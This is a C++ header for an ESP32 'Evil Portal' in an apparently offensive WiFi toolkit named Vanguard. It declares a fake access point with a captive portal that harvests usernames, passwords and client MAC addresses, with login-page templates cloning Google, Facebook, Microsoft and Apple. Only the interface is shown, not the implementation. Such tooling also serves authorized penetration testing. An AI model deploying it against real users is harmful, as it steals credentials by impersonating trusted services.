/**
 * @file EvilPortal.h
 * @brief Evil Portal - Captive portal for credential capture
 *
 * Creates a fake WiFi access point with a captive portal that
 * captures credentials when users try to "authenticate".
 */

#ifndef VANGUARD_EVIL_PORTAL_H
#define VANGUARD_EVIL_PORTAL_H

#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <vector>
#include <functional>

namespace Vanguard {

// =============================================================================
// CONSTANTS
// =============================================================================

constexpr uint16_t DNS_PORT = 53;
constexpr uint16_t WEB_PORT = 80;
constexpr size_t MAX_CREDENTIALS = 50;

// =============================================================================
// DATA STRUCTURES
// =============================================================================

/**
 * @brief Captured credential entry
 */
struct CapturedCredential {
    char ssid[33];           // Network name entered
    char username[65];       // Username/email entered
    char password[65];       // Password entered
    uint32_t capturedMs;     // When captured
    char clientMac[18];      // Client MAC address
};

/**
 * @brief Portal template type
 */
enum class PortalTemplate : uint8_t {
    GENERIC_WIFI,      // Generic WiFi login
    GOOGLE,            // Google sign-in clone
    FACEBOOK,          // Facebook login clone
    MICROSOFT,         // Microsoft login clone
    APPLE,             // Apple ID clone
    CUSTOM             // User-provided HTML
};

// =============================================================================
// CALLBACKS
// =============================================================================

using CredentialCallback = std::function<void(const CapturedCredential& cred)>;
using ClientConnectedCallback = std::function<void(int clientCount)>;

// =============================================================================
// EvilPortal Class
// =============================================================================

class EvilPortal {
public:
    /**
     * @brief Get singleton instance
     */
    static EvilPortal& getInstance();

    // Prevent copying
    EvilPortal(const EvilPortal&) = delete;
    EvilPortal& operator=(const EvilPortal&) = delete;

    // -------------------------------------------------------------------------
    // Lifecycle
    // -------------------------------------------------------------------------

    /**
     * @brief Start the evil portal
     *
     * @param ssid Network name to broadcast
     * @param channel WiFi channel (1-14)
     * @param tmpl Portal template to use
     * @return true if started successfully
     */
    bool start(const char* ssid, uint8_t channel = 1,
               PortalTemplate tmpl = PortalTemplate::GENERIC_WIFI);

    /**
     * @brief Stop the portal and restore WiFi
     */
    void stop();

    /**
     * @brief Non-blocking tick - must call in loop()
     */
    void tick();

    /**
     * @brief Check if portal is running
     */
    bool isRunning() const { return m_running; }

    // -------------------------------------------------------------------------
    // Configuration
    // -------------------------------------------------------------------------

    /**
     * @brief Get raw PROGMEM HTML pointer for a given template
     *
     * @param tpl Template type
     * @return Pointer to PROGMEM HTML string
     */
    static const char* getTemplateHtml(PortalTemplate tpl);

    /**
     * @brief Set custom portal HTML
     *
     * @param html HTML content (must include form posting to /login)
     */
    void setCustomHtml(const char* html);

    /**
     * @brief Set portal template
     */
    void setTemplate(PortalTemplate tmpl);

    // -------------------------------------------------------------------------
    // Results
    // -------------------------------------------------------------------------

    /**
     * @brief Get captured credentials
     */
    const std::vector<CapturedCredential>& getCredentials() const {
        return m_credentials;
    }

    /**
     * @brief Get credential count
     */
    size_t getCredentialCount() const { return m_credentials.size(); }

    /**
     * @brief Get connected client count
     */
    int getClientCount() const;

    /**
     * @brief Clear captured credentials
     */
    void clearCredentials() { m_credentials.clear(); }

    // -------------------------------------------------------------------------
    // Callbacks
    // -------------------------------------------------------------------------

    /**
     * @brief Register credential capture callback
     */
    void onCredentialCaptured(CredentialCallback cb) {
        m_onCredential = cb;
    }

    /**
     * @brief Register client connected callback
     */
    void onClientConnected(ClientConnectedCallback cb) {
        m_onClientConnected = cb;
    }

private:
    EvilPortal();
    ~EvilPortal();

    // State
    bool m_running;
    char m_ssid[33];
    uint8_t m_channel;
    PortalTemplate m_template;
    String m_customHtml;

    // Components
    DNSServer* m_dnsServer;
    AsyncWebServer* m_webServer;

    // Captured data
    std::vector<CapturedCredential> m_credentials;

    // Callbacks
    CredentialCallback m_onCredential;
    ClientConnectedCallback m_onClientConnected;

    // Client tracking
    int m_lastClientCount;

    // Internal methods
    void setupRoutes();
    String getPortalHtml();
    String getSuccessHtml();

    // Static handlers for async web server
    static void handleRoot(AsyncWebServerRequest* request);
    static void handleLogin(AsyncWebServerRequest* request);
    static void handleNotFound(AsyncWebServerRequest* request);
    static EvilPortal* s_instance;
};

} // namespace Vanguard

#endif // VANGUARD_EVIL_PORTAL_H
